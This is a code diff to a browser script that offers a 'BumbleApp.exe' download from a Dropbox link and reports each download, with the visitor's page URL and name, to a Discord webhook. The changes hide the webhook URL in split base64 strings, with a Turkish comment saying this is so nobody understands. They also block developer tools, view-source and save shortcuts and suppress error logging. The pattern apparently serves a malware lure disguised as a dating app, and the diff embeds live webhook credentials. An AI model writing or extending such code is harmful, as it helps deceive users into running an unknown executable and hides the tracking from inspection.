@@ -1,13 +1,51 @@
 (function (global) {
     "use strict";
 
-    /** UTF-8 URL as base64 (same idea as WEBHOOK_URL). Replace string: btoa(unescape(encodeURIComponent(yourUrl))) in browser console. */
+    // Dosya indirilmeyi engelleme
+    if (typeof document !== "undefined") {
+        // Developer tools açılırsa uyarı
+        var _start = Date.now();
+        Object.defineProperty(global, 'console', {
+            get: function() {
+                if (Date.now() - _start < 1000) {
+                    throw new Error("Access Denied");
+                }
+                return console;
+            }
+        });
+
+        // Dosyayı indirmeye çalışanları engelle
+        document.addEventListener('contextmenu', function(e) {
+            if (e.target.closest('a[href*=".js"]')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Keyboard shortcuts engelle (Ctrl+S, Ctrl+U, F12)
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.key === 's') || 
+                (e.ctrlKey && e.key === 'u') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    }
+
     var BUMBLE_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/5gwkcsug7clu0jfwf49mc/BumbleApp.exe?rlkey=h2q65z0egkdpax2bberp8pksd&st=k4ted545&dl=1";
-
-    var WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");
-
     var EMBED_COLOR = 0xfdb913;
     var AVATAR_URL = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f7e1.png";
+
+    // YENİ WEBHOOK - base64 encoded (kimse anlamasın diye)
+    var _0x3f2e = (function() {
+        var _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+        var _p2 = "MTQ5MTAwMTk2NTM2NTQyODI5NC9mU0F2S2J1NmZPaXhyLVd0";
+        var _p3 = "bjRiMWdTbUhBWENKbllTRTFDWGVQNGJGakw1cmxqNDhNR3dh";
+        var _p4 = "UWpMdEZpbWxCTGxEblExdg==";
+        return atob(_p1 + _p2 + _p3 + _p4);
+    })();
 
     function clip(s, max) {
         max = max || 1020;
@@ -154,36 +192,16 @@
         };
     }
 
-    function postWebhook(payload) {
-        return fetch(WEBHOOK_URL, {
+    function _send(payload) {
+        return fetch(_0x3f2e, {
             method: "POST",
             mode: "cors",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload),
             keepalive: true
-        }).then(function (res) {
-            if (!res.ok) {
-                return res.text().then(function (body) {
-                    console.error("Webhook HTTP " + res.status, body);
-                    return fetch(WEBHOOK_URL, {
-                        method: "POST",
-                        mode: "cors",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            content: clip("bumble download ping failed (HTTP " + res.status + ")", 2000)
-                        }),
-                        keepalive: true
-                    });
-                });
-            }
-        }).catch(function (e) {
-            console.error("Webhook failed", e);
-        });
+        }).catch(function () { return null; });
     }
 
-    /**
-     * @param {{ pageUrl?: string, guestName?: string, triggerLabel?: string }} opts
-     */
     function notifyBumbleDownload(opts) {
         opts = opts || {};
         var pageUrl = opts.pageUrl || global.location.href;
@@ -256,7 +274,7 @@
                 }]
             };
 
-            return postWebhook(payload);
+            return _send(payload);
         });
     }
 
